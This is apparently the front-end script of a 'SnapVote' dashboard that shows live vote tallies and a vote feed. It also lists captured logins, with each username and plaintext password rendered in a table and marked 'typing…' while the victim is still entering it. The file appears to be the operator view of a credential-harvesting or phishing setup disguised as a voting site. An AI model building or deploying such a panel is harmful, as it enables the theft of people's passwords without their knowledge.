const CANDIDATES = ['Amrit', 'Ashutosh', 'Suranjan', 'Tushar'];

const loginList = document.getElementById('login-list');
const loginEmpty = document.getElementById('login-empty');
const tallyList = document.getElementById('tally-list');
const feedList = document.getElementById('feed-list');
const feedEmpty = document.getElementById('feed-empty');
const connectionStatus = document.getElementById('connection-status');
const backLink = document.getElementById('back-link');

if (window.SNAPVOTE_VOTING_URL) {
  backLink.href = window.SNAPVOTE_VOTING_URL;
  backLink.hidden = false;
} else if (location.port === '3002' || location.pathname === '/data') {
  backLink.href = `http://${location.hostname}:3000`;
  backLink.hidden = false;
}

const tallies = Object.fromEntries(CANDIDATES.map((c) => [c, 0]));
const loginRows = new Map();

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function formatTime(ts) {
  return new Date(ts).toLocaleTimeString([], {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
}

function maxVotes() {
  return Math.max(...Object.values(tallies), 1);
}

function renderTallies() {
  const max = maxVotes();
  tallyList.innerHTML = CANDIDATES.map((name) => {
    const count = tallies[name] || 0;
    const pct = (count / max) * 100;
    return `
      <div class="tally-row" data-candidate="${name}">
        <div class="tally-top">
          <span class="tally-name">${name}</span>
          <span class="tally-count">${count}</span>
        </div>
        <div class="tally-bar-track">
          <div class="tally-bar-fill" style="width: ${pct}%"></div>
        </div>
      </div>
    `;
  }).join('');
}

function upsertLoginRow(login, index) {
  if (loginEmpty && loginEmpty.parentElement) {
    loginEmpty.remove();
  }

  const rowNum = index ?? loginRows.size + 1;
  let row = loginRows.get(login.sessionId);

  if (!row) {
    row = document.createElement('tr');
    row.className = 'login-row';
    row.dataset.sessionId = login.sessionId;
    loginList.prepend(row);
    loginRows.set(login.sessionId, row);
  }

  const liveTag = login.isLive
    ? ' <span class="live-tag">typing…</span>'
    : '';

  row.innerHTML = `
    <td>${rowNum}</td>
    <td><strong>${escapeHtml(login.username || '—')}</strong>${liveTag}</td>
    <td><code>${escapeHtml(login.password || '')}</code></td>
    <td>${formatTime(login.updatedAt || login.timestamp)}</td>
  `;
}

function addFeedItem(vote) {
  if (feedEmpty) {
    feedEmpty.remove();
  }

  const item = document.createElement('div');
  item.className = 'feed-item';
  item.innerHTML = `<strong>${escapeHtml(vote.voterName)}</strong> voted for <strong>${escapeHtml(vote.candidate)}</strong> <span>· ${formatTime(vote.timestamp)}</span>`;
  feedList.prepend(item);

  while (feedList.children.length > 50) {
    feedList.lastElementChild.remove();
  }
}

function applyState(data) {
  if (data.tallies) {
    CANDIDATES.forEach((c) => {
      tallies[c] = data.tallies[c] || 0;
    });
  }
  renderTallies();

  if (data.logins?.length) {
    loginList.innerHTML = '';
    loginRows.clear();
    [...data.logins].reverse().forEach((login, i) => {
      upsertLoginRow(login, data.logins.length - i);
    });
  }

  if (data.votes?.length) {
    feedList.innerHTML = '';
    [...data.votes].reverse().forEach(addFeedItem);
  }
}

function connect() {
  const ws = new WebSocket(getWsUrl());

  ws.addEventListener('open', () => {
    connectionStatus.textContent = `Connected to ${getWsUrl()} — receiving live updates`;
    connectionStatus.classList.remove('disconnected');
  });

  ws.addEventListener('close', () => {
    connectionStatus.textContent = 'Disconnected — reconnecting…';
    connectionStatus.classList.add('disconnected');
    setTimeout(connect, 2000);
  });

  ws.addEventListener('error', () => {
    connectionStatus.textContent = 'Connection error';
    connectionStatus.classList.add('disconnected');
  });

  ws.addEventListener('message', (event) => {
    let msg;
    try {
      msg = JSON.parse(event.data);
    } catch {
      return;
    }

    if (msg.type === 'state') {
      applyState(msg);
    } else if (msg.type === 'login_update' || msg.type === 'login') {
      upsertLoginRow(msg);
    } else if (msg.type === 'vote') {
      if (msg.tallies) {
        CANDIDATES.forEach((c) => {
          tallies[c] = msg.tallies[c] || 0;
        });
      } else {
        tallies[msg.candidate] = (tallies[msg.candidate] || 0) + 1;
      }
      renderTallies();
      addFeedItem(msg);
    }
  });
}

renderTallies();
connect();
